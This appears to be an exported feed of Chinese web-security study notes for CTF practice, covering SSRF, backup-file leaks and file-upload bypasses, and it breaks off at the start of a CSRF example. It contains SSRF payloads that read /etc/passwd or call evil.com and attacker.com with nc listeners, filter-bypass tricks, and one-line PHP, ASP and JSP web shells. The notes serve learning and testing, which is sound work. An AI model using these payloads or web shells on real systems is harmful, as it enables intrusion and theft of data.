    <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="一、SSRF是什么？"><a href="#一、SSRF是什么？" class="headerlink" title="一、SSRF是什么？"></a>一、SSRF是什么？</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p><p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><hr><h2 id="二、SSRF漏洞原理"><a href="#二、SSRF漏洞原理" class="headerlink" title="二、SSRF漏洞原理"></a>二、SSRF漏洞原理</h2><p><span data-type="text" style="background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);">SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</span></p><p><img src="/.com//image-20250520025641-k2sfyci.png" alt="image"></p><p>比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p><hr><h2 id="三、SSRF漏洞挖掘"><a href="#三、SSRF漏洞挖掘" class="headerlink" title="三、SSRF漏洞挖掘"></a>三、SSRF漏洞挖掘</h2><p>1、分享：通过URL地址分享网页内容</p><p><img src="/.com//image-20250520025700-u9pjgmi.png" alt="image"></p><p>2、转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。</p><p>3、在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p><p><img src="/.com//image-20250520025709-vdxc2ye.png" alt="image"></p><p>4、图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。</p><blockquote><p><a href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a></p></blockquote><p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p><p>5、未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p><p><img src="/.com//image-20250520025722-dq5eksz.png" alt="image"></p><p>6、图片加载与下载:通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。</p><p>(此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了?没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例水印、压缩等所以就可能造成SSRF问题)。</p><p>7、从URL关键字中寻找<br>利用google 语法加上这些关键字去寻找SSRF漏洞</p><blockquote><p>share<br>wap<br>url<br>link<br>src<br>source<br>target<br>u<br>display<br>sourceURl<br>imageURL<br>domain</p></blockquote><p>简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞</p><hr><h2 id="四、产生SSRF漏洞的函数"><a href="#四、产生SSRF漏洞的函数" class="headerlink" title="四、产生SSRF漏洞的函数"></a>四、产生SSRF漏洞的函数</h2><p>SSRF攻击可能存在任何语言编写的应用，接下来将举例&#x3D;&#x3D;php&#x3D;&#x3D;中可能存在SSRF漏洞的函数。</p><p><strong>1、file_get_contents:</strong></p><p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) <br>&#123; <br><span class="hljs-variable">$content</span> = file_get_contents(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]); <br><span class="hljs-variable">$filename</span> =<span class="hljs-string">&#x27;./images/&#x27;</span>.rand().<span class="hljs-string">&#x27;;img1.jpg&#x27;</span>; <br>file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span>); <br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]; <br><span class="hljs-variable">$img</span> = <span class="hljs-string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot;\&quot;/&gt;&quot;</span>; <br>&#125; <br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$img</span>; <br>?&gt;<br></code></pre></td></tr></table></figure><p><strong>2、sockopen():</strong></p><p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br><span class="hljs-keyword">function</span> GetFile(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span>) <br>&#123; <br><span class="hljs-variable">$fp</span> = fsockopen(<span class="hljs-variable">$host</span>, intval(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, 30); <br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$errstr</span> (error number <span class="hljs-variable">$errno</span>) \n&quot;</span>; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br><span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-variable">$link</span> HTTP/1.1\r\n&quot;</span>; <br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-variable">$host</span>\r\n&quot;</span>; <br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>fwrite(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br><span class="hljs-keyword">while</span> (!feof(<span class="hljs-variable">$fp</span>)) &#123; <br><span class="hljs-variable">$contents</span>.= fgets(<span class="hljs-variable">$fp</span>, 1024); <br>&#125; <br>fclose(<span class="hljs-variable">$fp</span>); <br><span class="hljs-built_in">return</span> <span class="hljs-variable">$contents</span>; <br>&#125; <br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p><strong>3、curl_exec():</strong></p><p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$curlobj</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curlobj</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curlobj</span>);<br> <br><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./curled/&#x27;</span>.<span class="hljs-title function_ invoke__">rand</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$result</span>); <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意事项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">一般情况下PHP不会开启fopen的gopher wrapper<br>file_get_contents的gopher协议不能URL编码<br>file_get_contents关于Gopher的302跳转会出现bug，导致利用失败<br>curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用<br>curl_exec() 默认不跟踪跳转，<br>file_get_contents() file_get_contents支持php://input协议<br></code></pre></td></tr></table></figure><hr><h2 id="五、SSRF中URL的伪协议"><a href="#五、SSRF中URL的伪协议" class="headerlink" title="五、SSRF中URL的伪协议"></a>五、SSRF中URL的伪协议</h2><p>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">file:/// 从文件系统中获取文件内容，如，file:///etc/passwd<br>dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：<br>sftp:// SSH文件传输协议或安全文件传输协议<br>ldap:// 轻量级目录访问协议<br>tftp:// 简单文件传输协议<br>gopher:// 分布式文档传递服务，可使用gopherus生成payload<br></code></pre></td></tr></table></figure><p><strong>1、file</strong></p><p>这种URL Schema可以尝试从文件系统中获取文件：</p><blockquote><p><a href="http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini">http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini</a></p></blockquote><p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p><p><strong>2、dict</strong></p><p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://example.com/ssrf.php?dict://evil.com:1337/<br>evil.com:$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp/*]<br>accepted (family 2, sport 31126)CLIENT libcurl 7.40.0<br></code></pre></td></tr></table></figure></blockquote><p><strong>3、sftp</strong></p><p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://example.com/ssrf.php?url=sftp://evil.com:1337/<br>evil.com:$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp/*]<br>accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2<br></code></pre></td></tr></table></figure></blockquote><p><strong>4、ldap:&#x2F;&#x2F;或ldaps:&#x2F;&#x2F; 或ldapi:&#x2F;&#x2F;</strong></p><p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit<br></code></pre></td></tr></table></figure></blockquote><p><strong>5、tftp:&#x2F;&#x2F;</strong></p><p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET<br>evil.com:# nc -lvup 1337<br>Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3<br></code></pre></td></tr></table></figure></blockquote><p><strong>6、gopher:&#x2F;&#x2F;</strong></p><p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header(<span class="hljs-string">&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;</span>);?&gt;<br>evil.com:# nc -lvp 1337<br>Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest<br></code></pre></td></tr></table></figure></blockquote><hr><h2 id="六、SSRF漏洞利用（危害）"><a href="#六、SSRF漏洞利用（危害）" class="headerlink" title="六、SSRF漏洞利用（危害）"></a>六、SSRF漏洞利用（危害）</h2><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p><p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p><p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p><p>5.利用file协议读取本地文件等。.</p><p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p><p>http:192.168.64.144&#x2F;phpmyadmin&#x2F;<br>file:&#x2F;&#x2F;&#x2F;D:&#x2F;<a href="http://www.txt/">www.txt</a><br>dict:&#x2F;&#x2F;192.168.64.144:3306&#x2F;info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a></p><hr><h2 id="七、SSRF绕过方式"><a href="#七、SSRF绕过方式" class="headerlink" title="七、SSRF绕过方式"></a>七、SSRF绕过方式</h2><p><strong>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</strong></p><p>一、常见的绕过方式</p><p><strong>1、限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</strong></p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">可以尝试采用http基本身份认证的方式绕过<br>如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异<br>在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。<br></code></pre></td></tr></table></figure></blockquote><p><strong>2.采用短网址绕过</strong></p><blockquote><p>比如百度短地址<a href="https://dwz.cn/">https://dwz.cn/</a></p></blockquote><p><strong>3.采用进制转换</strong></p><blockquote><p>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p></blockquote><p><img src="/.com//image-20250520030023-ukm1uls.png" alt="image"></p><p><strong>4.利用特殊域名</strong></p><blockquote><p>原理是DNS解析。<strong>xip.io</strong>可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p></blockquote><p><strong>5.利用[::]</strong></p><blockquote><p>可以利用[::]来绕过localhost<br><a href="http://169.254.169.254/%3E/%3Ehttp://[::169.254.169.254]">http://169.254.169.254\&gt;\&gt;http://[::169.254.169.254]</a></p></blockquote><p><strong>6.利用句号</strong></p><blockquote><p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p></blockquote><p><strong>7、CRLF 编码绕过</strong></p><blockquote><p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a <br></code></pre></td></tr></table></figure><p><strong>8.利用封闭的字母数字</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">利用Enclosed alphanumerics<br>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com<br>http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]<br>List:<br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳<br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇<br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛<br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵<br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ<br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴<br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿<br></code></pre></td></tr></table></figure><p>二、常见限制</p><p>1.限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名</p><blockquote><p>采用http基本身份认证的方式绕过，即@<br><a href="http://www.xxx.com@www.xxc.com/">http://www.xxx.com@www.xxc.com</a></p></blockquote><p>2.限制请求IP不为内网地址</p><blockquote><p>当不允许ip为内网地址时：<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p></blockquote><p>3.限制请求只为http协议</p><blockquote><p>（1）采取302跳转<br>（2）采取短地址</p></blockquote><hr><h2 id="八、SSRF漏防御"><a href="#八、SSRF漏防御" class="headerlink" title="八、SSRF漏防御"></a>八、SSRF漏防御</h2><p>通常有以下5个思路：</p><p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p><p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p><p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p><p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>备份文件</title>
    <link href="/2025/05/20/Web/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/"/>
    <url>/2025/05/20/Web/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="备份文件"><a href="#备份文件" class="headerlink" title="备份文件"></a>备份文件</h1><h1 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h1><p>题目经常需要进行代码审计，不过有时候不会把源码直接给我们，而是要我们自己发现。备份文件就是常见的源码泄露的方式，实践中往往是开发者的疏忽而忘记删除备份文件，从而导致服务器中残留源码。我们可以通过访问这些备份文件来审计代码，一般情况下可以用后台扫描工具扫描。例如 index.php，PHP 文件常见的备份文件格式有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">index.phps<br>index.php.swp<br>index.php.swo<br>index.php.php~<br>index.php.bak<br>index.php.txt<br>index.php.old<br></code></pre></td></tr></table></figure><p>​<code>d9d1c4d9e0d995cec9ac9f94995da89cc4a692a895a39ca69a669993a09dc6d4c6aac5cdc6a99c9569ad</code>​</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>备份文件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>工具使用</title>
    <link href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    <url>/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><p><a href="https://blog.csdn.net/qq_45300786/article/details/121588890">工具总结</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>不同场景的一句话木马</p><blockquote><p>php：</p><p>​<code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code>​</p><p>asp：</p><p>​<code>&lt;%eval request(&#39;pass&#39;)%&gt;</code>​ 或<code>&lt;% execute(request(&quot;pass&quot;)) %&gt;</code>​</p><p>aspx：</p><p>​<code>&lt;%@ Page Language=&#39;Jscript&#39;%&gt;&lt;%eval(Request.Item[&#39;pass&#39;],&#39;unsafe&#39;);%&gt;</code>​</p><p>jsp:</p><p>​<code>&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;UTF-8&quot; %&gt;&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt;</code>​</p></blockquote><blockquote><p>一句话木马  <?php @eval($_POST['a']);echo"luck"; ?></p></blockquote><h2 id="检查后缀"><a href="#检查后缀" class="headerlink" title="检查后缀"></a>检查后缀</h2><h3 id="一、黑名单"><a href="#一、黑名单" class="headerlink" title="一、黑名单"></a>一、黑名单</h3><h3 id="二、白名单"><a href="#二、白名单" class="headerlink" title="二、白名单"></a>二、白名单</h3><h2 id="检查内容"><a href="#检查内容" class="headerlink" title="检查内容"></a>检查内容</h2><h2 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h2><p>1.条件竞争</p><p>1.文件头检查2.突破getimagesize()3.突破exif_imagetype()4.二次渲染</p><p>1.MIME 绕过2.%00 截断3.0x00 截断</p><p>1.上传特殊可解析后缀2.上传.htaccess3.后缀大小写绕过4.点绕过5.空格绕过6.::$DATA绕过<br>7.配合解析漏洞<br>Apache 陌生后缀解析漏洞<br>Apache 换行解析漏洞<br>8.双后缀名绕过</p><p><a href="https://blog.csdn.net/bin789456/article/details/118761276?spm=1001.2014.3001.5501">文件上传漏洞练习 upload-labs（1~5）【js过滤，MIME过滤，黑名单过滤,.htaccess文件攻击,.user,ini文件攻击】_js通过过滤器黑名单-CSDN博客</a></p><p><a href="https://www.freebuf.com/articles/web/354431.html">Web安全之文件上传-WAF绕过-免杀 - FreeBuf网络安全行业门户</a></p><p>‍</p><p>‍</p><p>绕过类型php,php3,php4,php5,phtml.pht</p><p>有时候限制了文件类型，可以上传phtml，<strong>phtml一般是指嵌入了php代码的html文件，但是同样也会作为php解析</strong></p><p>有时候限制文件内容，不能包含&lt;?，可以进行</p><p>​<code>&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[1234])</code>​</p><p>​<code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[shell]);</code>​</p><p>​<code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;a&#39;]);&lt;/script&gt;</code>​</p><p>​<code>&lt;script language=&#39;php&#39;&gt;system(&#39;cat /flag&#39;);&lt;/script&gt;</code>​</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>注入漏洞</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="注入漏洞"><a href="#注入漏洞" class="headerlink" title="注入漏洞"></a>注入漏洞</h1>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>注入漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>未命名</title>
    <link href="/2025/05/20/Web/CSRF/%E6%9C%AA%E5%91%BD%E5%90%8D/"/>
    <url>/2025/05/20/Web/CSRF/%E6%9C%AA%E5%91%BD%E5%90%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="未命名"><a href="#未命名" class="headerlink" title="未命名"></a>未命名</h1><h4 id="示例恶意页面"><a href="#示例恶意页面" class="headerlink" title="示例恶意页面"></a><strong>示例恶意页面</strong></h4><p>下面是一份示例代码，展示了如何利用 CSRF 触发反射型 XSS，然后 fetch() 页面获取 flag 内容并发送到攻击者服务器：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span 